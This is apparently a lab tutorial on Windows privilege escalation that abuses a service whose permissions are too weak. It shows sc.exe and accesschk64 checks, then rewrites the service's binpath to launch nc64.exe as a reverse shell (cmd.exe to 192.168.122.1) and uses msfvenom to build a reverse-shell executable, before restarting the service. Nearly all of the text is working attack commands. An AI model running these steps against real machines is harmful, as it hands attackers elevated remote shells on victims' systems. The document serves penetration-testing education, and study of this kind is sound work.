We can view the configuration of a service with the `sc.exe' command.
```powershell
sc.exe qc SimpleService
```

Use the `accesschk64` program to check if we have privileges over that process.
- https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
```powershell
.\accesschk64.exe /accepteula -uwcqv SimpleService
```
Where the flags mean:
- `-u` - show permission for a user/group
- `-w` - show owner's access rights on the object
- `-c` - show effective access right, taking into account any deny permissions
- `-q` - supresses any other output
- `-v` - shows the names of all objects

We can modify the `binpath` as follows
```powershell
sc.exe config SimpleService binpath="C:\Users\Quickemu\Downloads\simpleService.exe"
```

```powershell
sc.exe config SimpleService binpath="C:\Users\Quickemu\Downloads\nc64.exe 192.168.122.1 4321 -e C:\Windows\system32\cmd.exe"
```

A typical attack could then be:

1. We create a malicious executable that triggers a reverse shell and we upload it to the victim machine
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f exe -o malicious.exe
```

2. We change the executable path of a given service
```powershell
sc.exe config SimpleService binpath="C:\Users\Quickemu\Downloads\malicious.exe"
```

3. We stop and start the service
```powershell
sc.exe stop SimpleService
```

```powershell
sc.exe start SimpleService
```
